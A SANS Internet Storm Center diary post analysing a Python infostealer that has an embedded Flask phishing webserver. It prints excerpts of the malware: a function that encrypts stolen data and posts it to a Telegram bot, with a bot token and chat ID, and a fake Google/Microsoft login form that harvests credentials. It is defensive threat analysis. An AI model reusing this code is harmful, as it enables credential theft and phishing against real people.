---
title: Python InfoStealer with Embedded Phishing Webserver, (Tue, May 6th)
url: https://isc.sans.edu/diary/rss/31924
source: SANS Internet Storm Center, InfoCON: green
date: 2025-05-07
fetch_date: 2025-10-06T22:30:45.652071
---

# Python InfoStealer with Embedded Phishing Webserver, (Tue, May 6th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/31920)
* [next](/diary/31928)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

# [Python InfoStealer with Embedded Phishing Webserver](/forums/diary/Python%2BInfoStealer%2Bwith%2BEmbedded%2BPhishing%2BWebserver/31924/)

**Published**: 2025-05-06. **Last Updated**: 2025-05-06 06:02:58 UTC
**by** [Xavier Mertens](/handler_list.html#xavier-mertens) (Version: 1)

[0 comment(s)](/diary/Python%2BInfoStealer%2Bwith%2BEmbedded%2BPhishing%2BWebserver/31924/#comments)

Infostealers are everywhere for a while now. If this kind of malware is not aggressive, their impact can be much more impacting to the victim. Attackers need always more and more data to be sold or reused in deeper scenarios. A lot of infostealers are similar and have the following capabilities:

* Antidebugging and anti-VM capabilities
* Persistence
* Data scanner (credentials, cookies, wallets, "interesting" keyword in files, ...)
* Exfiltration

I found another malicious Python script that implements all these capabilities. Persistence is implemeted via a Registry key and a scheduled task (always have a backup solution ![wink](https://isc.sans.edu/3p/ckeditor4_11/plugins/smiley/images/wink_smile.png "wink")), a keylogger is started, the clipboard content is captured, a screenshot is taken every minute. All data is exfiltrated to a Telegram channel, encrtypted with the Fernet() module:

```

brAljAVm = "7740489037:AAHgOz-DbTeXM-IqY9luQNPL4uao1kWrudU"
WmeLPHIr = "5395609882"
UJSfiUOF = f"hxxps://api[.]telegram[.]org/bot{brAljAVm}"

def TeqIMJxB(text):
    try:
        enc = bsSlwZVy.encrypt(text.encode())
        requests.post(f"{UJSfiUOF}/sendMessage", data={"chat_id": WmeLPHIr, "text": enc.decode()})
    except:
        pass
```

All "modules" are started in separate threads:

```

threading.Thread(target=HXSuYqeM, daemon=True).start()
threading.Thread(target=FRgNaDwJ, daemon=True).start()
threading.Thread(target=yReyYwvL, daemon=True).start()
threading.Thread(target=MinLOVga, daemon=True).start()
```

What's different in this InfoStealer? The presense of an embedded Flask server[[1](https://flask.palletsprojects.com/en/stable/)] used to spawn a rogue webserver:

```

def MinLOVga():
    app = Flask(__name__)
    fake_sites = {
        "google": "https://accounts.google.com",
        "microsoft": "https://login.microsoftonline.com"
    }
    @app.route("/login/<template>", methods=["GET", "POST"])
    def login(template):
        if request.method == "POST":
            creds = f"{request.form.get('username')}:{request.form.get('password')}"
            TeqIMJxB(f"? {template.upper()} PHISH: {creds}")
            return redirect(fake_sites.get(template, "https://google.com"))
        return '''
        <form method="POST">
            <input name="username" placeholder="Email"><br>
            <input name="password" type="password" placeholder="Password"><br>
            <button>Login</button>
        </form>
        '''
    try:
        context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
        context.load_cert_chain("cert.pem", "key.pem")
        threading.Thread(target=app.run, kwargs={
            "host": "0.0.0.0", "port": 443, "ssl_context": context
        }, daemon=True).start()
    except: pass
```

You can see that the HTTPS server is started using local files cert.pem and key.pem. I did not find them. I presume that this script is part of a "package" distributed to the victim and containing all required files.

The script is called "2.py" (SHA256:538485a12db0a673623dfbf1ea1ae61a68c5e8f0df5049a51399f30d48aa15d2). Based on the comments in the code, it seems to have been developed by a Turkish threat actor. The VT score is still very low: 3/63[[2](https://www.virustotal.com/gui/file/538485a12db0a673623dfbf1ea1ae61a68c5e8f0df5049a51399f30d48aa15d2/detection)].

[1] <https://flask.palletsprojects.com/en/stable/>
[2] <https://www.virustotal.com/gui/file/538485a12db0a673623dfbf1ea1ae61a68c5e8f0df5049a51399f30d48aa15d2/detection>

Xavier Mertens (@xme)
Xameco
Senior ISC Handler - Freelance Cyber Security Consultant
[PGP Key](https://keybase.io/xme/key.asc)

Keywords: [Flask](/tag.html?tag=Flask) [InfoStealer](/tag.html?tag=InfoStealer) [Malware](/tag.html?tag=Malware) [Phishing](/tag.html?tag=Phishing) [Python](/tag.html?tag=Python)

[0 comment(s)](/diary/Python%2BInfoStealer%2Bwith%2BEmbedded%2BPhishing%2BWebserver/31924/#comments)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

* [previous](/diary/31920)
* [next](/diary/31928)

### Comments

[Login here to join the discussion.](/login)

Top of page

×

![modal content]()

[Diary Archives](/diaryarchive.html)

* [![SANS.edu research journal](https://isc.sans.edu/images/researchjournal5.png)](/j/research)
* [Homepage](/index.html)
* [Diaries](/diaryarchive.html)
* [Podcasts](/podcast.html)
* [Jobs](/jobs)
* [Data](/data)
  + [TCP/UDP Port Activity](/data/port.html)
  + [Port Trends](/data/trends.html)
  + [SSH/Telnet Scanning Activity](/data/ssh.html)
  + [Weblogs](/weblogs)
  + [Domains](/data/domains.html)
  + [Threat Feeds Activity](/data/threatfeed.html)
  + [Threat Feeds Map](/data/threatmap.html)
  + [Useful InfoSec Links](/data/links.html)
  + [Presentations & Papers](/data/presentation.html)
  + [Research Papers](/data/researchpapers.html)
  + [API](/api)
* [Tools](/tools/)
  + [DShield Sensor](/howto.html)
  + [DNS Looking Glass](/tools/dnslookup)
  + [Honeypot (RPi/AWS)](/tools/honeypot)
  + [InfoSec Glossary](/tools/glossary)
* [Contact Us](/contact.html)
  + [Contact Us](/contact.html)
  + [About Us](/about.html)
  + [Handlers](/handler_list.html)* [About Us](/about.html)

[Slack Channel](/slack/index.html)

[Mastodon](https://infosec.exchange/%40sans_isc)

[Bluesky](https://bsky.app/profile/sansisc.bsky.social)

[X](https://twitter.com/sans_isc)

![](/adimg.html?id=)

© 2025 SANS™ Internet Storm Center
Developers: We have an [API](/api/) for you!   [![Creative Commons License](/images/cc.png)](https://creativecommons.org/licenses/by-nc-sa/4.0/)

* [Link To Us](/linkback.html)
* [About Us](/about.html)
* [Handlers](/handler_list.html)
* [Privacy Policy](/privacy.html)